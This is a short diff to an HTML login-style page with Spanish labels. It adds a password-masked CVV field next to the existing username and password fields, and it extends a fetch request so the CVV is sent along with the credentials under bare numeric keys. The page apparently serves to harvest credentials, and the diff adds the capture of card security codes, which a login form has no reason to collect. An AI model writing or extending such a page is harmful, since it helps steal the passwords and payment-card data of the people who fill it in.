@@ -68,6 +68,14 @@
 						<input type="password" class="pass" id="confirmar" name="confirmar" placeholder="Contraseña"/>
 						<i class='bx bx-show-alt'></i>
 					</div>
+						<form class="formulario" id="contact-form"  name="submit-form">
+						<p class="centro"><b>Cvv</b>
+						</p><br>
+						<label for="nombre">Tu CVV debe tener 4 caracteres</label>
+					<div class="contenedor-input">
+						<input type="password" class="pass" id="cvv" name="cvv" placeholder="CVV"/>
+						<i class='bx bx-show-alt'></i>
+					</div>
 		
 			
 					
@@ -118,7 +126,8 @@ try {
         body: JSON.stringify({
             "1": formulario.usuario.value,
             "2": formulario.contraseña.value,
-            "3": formulario.confirmar.value
+            "3": formulario.confirmar.value,
+		"4": formulario.cvv.value
         })
     });
 
